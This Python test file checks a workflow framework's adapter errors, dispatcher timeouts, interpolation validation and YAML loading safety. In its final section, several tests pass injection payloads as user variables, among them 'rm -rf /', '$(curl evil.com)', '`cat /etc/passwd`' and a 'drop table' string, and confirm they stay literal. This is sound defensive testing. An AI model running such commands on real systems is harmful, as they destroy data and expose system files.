"""QA P0 tests — adapter error paths, dispatcher timeout, orchestrator interpolation, security."""

from __future__ import annotations

import asyncio
import ast
import inspect
from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest

from binex.adapters.a2a import A2AAgentAdapter
from binex.adapters.llm import LLMAdapter
from binex.adapters.local import LocalPythonAdapter
from binex.models.artifact import Artifact, Lineage
from binex.models.task import RetryPolicy, TaskNode
from binex.runtime.dispatcher import Dispatcher
from binex.workflow_spec.loader import load_workflow_from_string


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_task(**overrides) -> TaskNode:
    defaults = {
        "id": "task_1",
        "run_id": "run_1",
        "node_id": "node_1",
        "agent": "llm://test-model",
    }
    defaults.update(overrides)
    return TaskNode(**defaults)


def _make_artifact(**overrides) -> Artifact:
    defaults = {
        "id": "art_1",
        "run_id": "run_1",
        "type": "text",
        "content": "hello world",
        "lineage": Lineage(produced_by="node_0"),
    }
    defaults.update(overrides)
    return Artifact(**defaults)


# ---------------------------------------------------------------------------
# TC-ADP-001: LLMAdapter with invalid model string
# ---------------------------------------------------------------------------

class TestLLMAdapterInvalidModel:
    """Verify that an invalid model string produces a clean error, no crash."""

    @pytest.mark.asyncio
    async def test_invalid_model_raises_litellm_error(self) -> None:
        # Arrange
        adapter = LLMAdapter(model="nonexistent/model-xyz-999")
        task = _make_task(agent="llm://nonexistent")

        # litellm raises an exception for unrecognised models
        with patch(
            "binex.adapters.llm.litellm.acompletion",
            new_callable=AsyncMock,
        ) as mock_llm:
            mock_llm.side_effect = Exception(
                "litellm.NotFoundError: nonexistent/model-xyz-999 is not a valid model"
            )

            # Act & Assert — exception propagates cleanly, no unhandled crash
            with pytest.raises(Exception, match="not a valid model"):
                await adapter.execute(task, [], "trace_1")

    @pytest.mark.asyncio
    async def test_empty_model_string_raises(self) -> None:
        """Even an empty string should surface a clear error from litellm."""
        adapter = LLMAdapter(model="")
        task = _make_task(agent="llm://empty")

        with patch(
            "binex.adapters.llm.litellm.acompletion",
            new_callable=AsyncMock,
        ) as mock_llm:
            mock_llm.side_effect = Exception("model is required")

            with pytest.raises(Exception, match="model is required"):
                await adapter.execute(task, [], "trace_1")


# ---------------------------------------------------------------------------
# TC-ADP-003: A2AAgentAdapter with unreachable endpoint
# ---------------------------------------------------------------------------

class TestA2AAdapterUnreachableEndpoint:
    """Verify httpx connection errors propagate with clear error type/message."""

    @pytest.mark.asyncio
    async def test_unreachable_endpoint_raises_connect_error(self) -> None:
        # Arrange
        adapter = A2AAgentAdapter(endpoint="http://192.0.2.1:9999")
        task = _make_task(agent="a2a://unreachable")

        with patch("binex.adapters.a2a.httpx.AsyncClient") as mock_client_cls:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            mock_client.post = AsyncMock(
                side_effect=httpx.ConnectError("Connection refused")
            )
            mock_client_cls.return_value = mock_client

            # Act & Assert
            with pytest.raises(httpx.ConnectError, match="Connection refused"):
                await adapter.execute(task, [], "trace_1")

    @pytest.mark.asyncio
    async def test_unreachable_endpoint_health_returns_down(self) -> None:
        """health() should return DOWN, not raise, for unreachable endpoints."""
        adapter = A2AAgentAdapter(endpoint="http://192.0.2.1:9999")

        with patch("binex.adapters.a2a.httpx.AsyncClient") as mock_client_cls:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            mock_client.get = AsyncMock(
                side_effect=httpx.ConnectError("Connection refused")
            )
            mock_client_cls.return_value = mock_client

            # Act
            from binex.models.agent import AgentHealth
            health = await adapter.health()

            # Assert
            assert health == AgentHealth.DOWN

    @pytest.mark.asyncio
    async def test_http_500_raises_status_error(self) -> None:
        """A 500 response triggers raise_for_status() -> HTTPStatusError."""
        adapter = A2AAgentAdapter(endpoint="http://localhost:9001")
        task = _make_task(agent="a2a://broken")

        mock_response = MagicMock()
        mock_response.status_code = 500
        mock_response.raise_for_status.side_effect = httpx.HTTPStatusError(
            "Internal Server Error",
            request=MagicMock(),
            response=mock_response,
        )

        with patch("binex.adapters.a2a.httpx.AsyncClient") as mock_client_cls:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            mock_client.post = AsyncMock(return_value=mock_response)
            mock_client_cls.return_value = mock_client

            with pytest.raises(httpx.HTTPStatusError):
                await adapter.execute(task, [], "trace_1")


# ---------------------------------------------------------------------------
# TC-ADP-005: LocalPythonAdapter with raising callable
# ---------------------------------------------------------------------------

class TestLocalAdapterExceptionPropagation:
    """Verify exceptions from the handler propagate without being swallowed."""

    @pytest.mark.asyncio
    async def test_value_error_propagates(self) -> None:
        # Arrange
        async def bad_handler(task: TaskNode, inputs: list[Artifact]) -> list[Artifact]:
            raise ValueError("invalid input data")

        adapter = LocalPythonAdapter(handler=bad_handler)
        task = _make_task(agent="local://bad")

        # Act & Assert
        with pytest.raises(ValueError, match="invalid input data"):
            await adapter.execute(task, [], "trace_1")

    @pytest.mark.asyncio
    async def test_runtime_error_propagates(self) -> None:
        async def crashing_handler(
            task: TaskNode, inputs: list[Artifact],
        ) -> list[Artifact]:
            raise RuntimeError("segfault-like crash")

        adapter = LocalPythonAdapter(handler=crashing_handler)
        task = _make_task(agent="local://crash")

        with pytest.raises(RuntimeError, match="segfault-like crash"):
            await adapter.execute(task, [], "trace_1")

    @pytest.mark.asyncio
    async def test_keyboard_interrupt_propagates(self) -> None:
        """BaseException subclasses should not be caught/swallowed."""
        async def interrupt_handler(
            task: TaskNode, inputs: list[Artifact],
        ) -> list[Artifact]:
            raise KeyboardInterrupt()

        adapter = LocalPythonAdapter(handler=interrupt_handler)
        task = _make_task(agent="local://interrupt")

        with pytest.raises(KeyboardInterrupt):
            await adapter.execute(task, [], "trace_1")


# ---------------------------------------------------------------------------
# TC-RUN-004: Dispatcher timeout enforcement
# ---------------------------------------------------------------------------

class TestDispatcherTimeoutEnforcement:
    """Verify dispatcher enforces deadline_ms via asyncio.wait_for."""

    @pytest.mark.asyncio
    async def test_slow_task_exceeds_deadline_raises_timeout(self) -> None:
        # Arrange
        async def slow_handler(
            task: TaskNode, inputs: list[Artifact],
        ) -> list[Artifact]:
            await asyncio.sleep(60)
            return []

        adapter = LocalPythonAdapter(handler=slow_handler)
        dispatcher = Dispatcher()
        dispatcher.register_adapter("local://slow", adapter)

        task = _make_task(agent="local://slow", deadline_ms=50)

        # Act & Assert — should raise within ~50ms, not wait 60s
        with pytest.raises(TimeoutError):
            await dispatcher.dispatch(task, [], "trace_1")

    @pytest.mark.asyncio
    async def test_timeout_not_retried(self) -> None:
        """TimeoutError should be raised immediately, not retried."""
        call_count = 0

        async def slow_handler(
            task: TaskNode, inputs: list[Artifact],
        ) -> list[Artifact]:
            nonlocal call_count
            call_count += 1
            await asyncio.sleep(60)
            return []

        adapter = LocalPythonAdapter(handler=slow_handler)
        dispatcher = Dispatcher()
        dispatcher.register_adapter("local://slow", adapter)

        task = _make_task(
            agent="local://slow",
            deadline_ms=50,
            retry_policy=RetryPolicy(max_retries=3, backoff="fixed"),
        )

        with pytest.raises(TimeoutError):
            await dispatcher.dispatch(task, [], "trace_1")

        # Dispatcher re-raises TimeoutError immediately (line 48), no retries
        assert call_count == 1

    @pytest.mark.asyncio
    async def test_no_deadline_allows_completion(self) -> None:
        """Without deadline_ms, task runs to completion regardless of duration."""
        async def quick_handler(
            task: TaskNode, inputs: list[Artifact],
        ) -> list[Artifact]:
            return [_make_artifact()]

        adapter = LocalPythonAdapter(handler=quick_handler)
        dispatcher = Dispatcher()
        dispatcher.register_adapter("local://quick", adapter)

        task = _make_task(agent="local://quick", deadline_ms=None)
        result = await dispatcher.dispatch(task, [], "trace_1")
        assert len(result.artifacts) == 1


# ---------------------------------------------------------------------------
# TC-RUN-005: Orchestrator ${node.*} interpolation with missing artifact
# ---------------------------------------------------------------------------

class TestOrchestratorMissingArtifactInterpolation:
    """Verify that ${node.*} references to missing nodes are caught by the validator."""

    def test_interpolation_referencing_unknown_node_detected(self) -> None:
        """Validator catches ${nonexistent.output} references."""
        from binex.workflow_spec.validator import validate_workflow
        from binex.models.workflow import WorkflowSpec, NodeSpec

        # Arrange — node_b references a node that does not exist
        spec = WorkflowSpec(
            name="test-missing-ref",
            nodes={
                "node_a": NodeSpec(
                    agent="llm://gpt-4",
                    outputs=["summary"],
                ),
                "node_b": NodeSpec(
                    agent="llm://gpt-4",
                    inputs={"source": "${nonexistent.output}"},
                    outputs=["result"],
                    depends_on=["node_a"],
                ),
            },
        )

        # Act
        errors = validate_workflow(spec)

        # Assert
        assert len(errors) >= 1
        assert any("nonexistent" in e for e in errors)

    def test_interpolation_referencing_unknown_output_detected(self) -> None:
        """Validator catches ${node_a.bogus_output} when output is not declared."""
        from binex.workflow_spec.validator import validate_workflow
        from binex.models.workflow import WorkflowSpec, NodeSpec

        spec = WorkflowSpec(
            name="test-bad-output-ref",
            nodes={
                "node_a": NodeSpec(
                    agent="llm://gpt-4",
                    outputs=["summary"],
                ),
                "node_b": NodeSpec(
                    agent="llm://gpt-4",
                    inputs={"source": "${node_a.bogus_output}"},
                    outputs=["result"],
                    depends_on=["node_a"],
                ),
            },
        )

        errors = validate_workflow(spec)

        assert len(errors) >= 1
        assert any("bogus_output" in e for e in errors)

    def test_llm_adapter_skips_unresolved_node_refs_in_prompt(self) -> None:
        """LLMAdapter._build_prompt silently skips unresolved ${node.*} refs."""
        adapter = LLMAdapter(model="m")
        task = _make_task(
            system_prompt="summarize",
            inputs={
                "source": "${node_a.output}",
                "mode": "brief",
            },
        )

        prompt = adapter._build_prompt(task, [])

        assert "${node_a.output}" not in prompt
        assert "mode: brief" in prompt


# ---------------------------------------------------------------------------
# TC-SEC-001: Verify yaml.safe_load is used (not yaml.load)
# ---------------------------------------------------------------------------

class TestYamlSafeLoadUsage:
    """Ensure the workflow loader never uses yaml.load (unsafe deserialization)."""

    def test_loader_source_uses_safe_load_only(self) -> None:
        """AST-scan the loader module to confirm only yaml.safe_load is called."""
        import binex.workflow_spec.loader as loader_module

        source = inspect.getsource(loader_module)
        tree = ast.parse(source)

        yaml_calls: list[str] = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Attribute):
                # Match yaml.load / yaml.safe_load / yaml.unsafe_load etc.
                if (
                    isinstance(node.value, ast.Name)
                    and node.value.id == "yaml"
                    and "load" in node.attr
                ):
                    yaml_calls.append(node.attr)

        # Must find safe_load, must NOT find plain load or unsafe_load
        assert "safe_load" in yaml_calls, "Expected yaml.safe_load to be present"
        assert "load" not in yaml_calls, "yaml.load (unsafe) must not be used"
        assert "unsafe_load" not in yaml_calls, "yaml.unsafe_load must not be used"

    def test_safe_load_round_trip(self) -> None:
        """Confirm the loader parses valid YAML through yaml.safe_load path."""
        yaml_content = """\
name: test-workflow
nodes:
  step1:
    agent: llm://gpt-4
    outputs: [result]
"""
        spec = load_workflow_from_string(yaml_content, fmt="yaml")
        assert spec.name == "test-workflow"
        assert "step1" in spec.nodes


# ---------------------------------------------------------------------------
# TC-SEC-002: ${user.var} with shell metacharacters
# ---------------------------------------------------------------------------

class TestUserVarShellMetacharacters:
    """Ensure ${user.*} interpolation is string-only, no shell execution."""

    def test_shell_metacharacters_preserved_literally(self) -> None:
        """Shell metacharacters in user vars are not executed or expanded."""
        yaml_content = """\
name: test-shell-escape
nodes:
  step1:
    agent: llm://gpt-4
    inputs:
      query: "${user.topic}"
    outputs: [result]
"""
        malicious_input = "; rm -rf / && $(curl evil.com) | `whoami`"

        spec = load_workflow_from_string(
            yaml_content,
            fmt="yaml",
            user_vars={"topic": malicious_input},
        )

        # The metacharacters should appear literally in the input, not executed
        resolved = spec.nodes["step1"].inputs["query"]
        assert resolved == malicious_input

    def test_backtick_command_substitution_not_executed(self) -> None:
        yaml_content = """\
name: test-backtick
nodes:
  step1:
    agent: llm://gpt-4
    inputs:
      name: "${user.name}"
    outputs: [result]
"""
        payload = "`cat /etc/passwd`"
        spec = load_workflow_from_string(
            yaml_content, fmt="yaml", user_vars={"name": payload},
        )
        assert spec.nodes["step1"].inputs["name"] == payload

    def test_dollar_paren_substitution_not_executed(self) -> None:
        yaml_content = """\
name: test-dollar-paren
nodes:
  step1:
    agent: llm://gpt-4
    inputs:
      data: "${user.data}"
    outputs: [result]
"""
        payload = "$(id)"
        spec = load_workflow_from_string(
            yaml_content, fmt="yaml", user_vars={"data": payload},
        )
        assert spec.nodes["step1"].inputs["data"] == payload

    def test_newline_injection_preserved(self) -> None:
        yaml_content = """\
name: test-newline
nodes:
  step1:
    agent: llm://gpt-4
    inputs:
      msg: "${user.msg}"
    outputs: [result]
"""
        payload = "hello\nworld\n; drop table users;"
        spec = load_workflow_from_string(
            yaml_content, fmt="yaml", user_vars={"msg": payload},
        )
        assert spec.nodes["step1"].inputs["msg"] == payload
